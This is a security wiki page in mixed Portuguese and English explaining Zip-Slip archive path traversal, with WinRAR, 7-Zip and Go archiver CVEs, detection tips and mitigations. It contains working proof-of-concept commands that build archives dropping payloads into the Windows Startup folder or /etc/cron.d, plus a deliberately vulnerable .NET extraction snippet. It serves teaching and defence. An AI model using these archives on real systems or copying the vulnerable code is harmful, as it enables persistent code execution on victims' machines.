# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Visão geral

Muitos formatos de arquivo (ZIP, RAR, TAR, 7-ZIP, etc.) permitem que cada entrada carregue seu próprio **caminho interno**. Quando uma ferramenta de extração honra cegamente esse caminho, um nome de arquivo forjado contendo `..` ou um **absolute path** (ex.: `C:\Windows\System32\`) será escrito fora do diretório escolhido pelo usuário.
This class of vulnerability is widely known as *Zip-Slip* or **archive extraction path traversal**.

Consequências variam desde sobrescrever arquivos arbitrários até obter diretamente **remote code execution (RCE)** ao colocar um payload em um local de **auto-run**, como a pasta *Startup* do Windows.

## Causa raiz

1. O atacante cria um arquivo onde um ou mais cabeçalhos de arquivo contêm:
* Sequências de travessia relativas (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Caminhos absolutos (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Ou **symlinks** criados que resolvem fora do diretório alvo (comum em ZIP/TAR no *nix*).
2. A vítima extrai o arquivo com uma ferramenta vulnerável que confia no caminho embutido (ou segue symlinks) em vez de sanitizá-lo ou forçar a extração sob o diretório escolhido.
3. O arquivo é gravado no local controlado pelo atacante e executado/carregado na próxima vez que o sistema ou o usuário acionar esse caminho.

### .NET `Path.Combine` + `ZipArchive` traversal

Um anti-padrão comum em .NET é combinar o destino pretendido com **controlado pelo usuário** `ZipArchiveEntry.FullName` e extrair sem normalizar o caminho:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Se `entry.FullName` começa com `..\\` isso permite path traversal; se for um **absolute path** o componente à esquerda é descartado completamente, resultando em um **arbitrary file write** como identidade de extração.
- Arquivo de prova de conceito para escrever em um diretório irmão `app` monitorado por um scanner agendado:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Dropping that ZIP into the monitored inbox results in `C:\samples\app\0xdf.txt`, proving traversal outside `C:\samples\queue\` and enabling follow-on primitives (e.g., DLL hijacks).

## Exemplo do mundo real – WinRAR ≤ 7.12 (CVE-2025-8088)

O WinRAR para Windows (incluindo o `rar` / `unrar` CLI, a DLL e o código-fonte portátil) não validava nomes de arquivos durante a extração.
Um arquivo RAR malicioso contendo uma entrada como:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
acabaria **fora** do diretório de saída selecionado e dentro da pasta *Startup* do usuário. Após o logon, o Windows executa automaticamente tudo presente lá, fornecendo RCE *persistente*.

### Criando um PoC Archive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Opções usadas:
* `-ep`  – armazenar caminhos de ficheiro exactamente como fornecidos (não **remover** o prefixo `./`).

Deliver `evil.rar` to the victim and instruct them to extract it with a vulnerable WinRAR build.

### Observed Exploitation in the Wild

ESET reported RomCom (Storm-0978/UNC2596) spear-phishing campaigns that attached RAR archives abusing CVE-2025-8088 to deploy customised backdoors and facilitate ransomware operations.

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. User interaction is just *opening/extracting* the archive.
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Impact path**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
On a patched build `/etc/cron.d` won’t be touched; the symlink is extracted as a link inside /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
* **Fix**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – List archive entries and flag any name containing `../`, `..\\`, *absolute paths* (`/`, `C:`) or entries of type *symlink* whose target is outside the extraction dir.
* **Canonicalização** – Assegure que `realpath(join(dest, name))` ainda começa com `dest`. Rejeitar caso contrário.
* **Sandbox extraction** – Decomprimir num directório descartável usando um extractor *safe* (por ex., `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) e verificar que os caminhos resultantes permanecem dentro do directório.
* **Endpoint monitoring** – Alertar sobre novos executáveis escritos em locais `Startup`/`Run`/`cron` pouco depois de um arquivo ser aberto por WinRAR/7-Zip/etc.

## Mitigation & Hardening

1. **Update the extractor** – WinRAR 7.13+ and 7-Zip 25.00+ implement path/symlink sanitisation. Both tools still lack auto-update.
2. Extract archives with “**Do not extract paths**” / “**Ignore paths**” when possible.
3. On Unix, drop privileges & mount a **chroot/namespace** before extraction; on Windows, use **AppContainer** or a sandbox.
4. If writing custom code, normalise with `realpath()`/`PathCanonicalize()` **before** create/write, and reject any entry that escapes the destination.

## Additional Affected / Historical Cases

* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Any custom extraction logic that fails to call `PathCanonicalize` / `realpath` prior to write.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
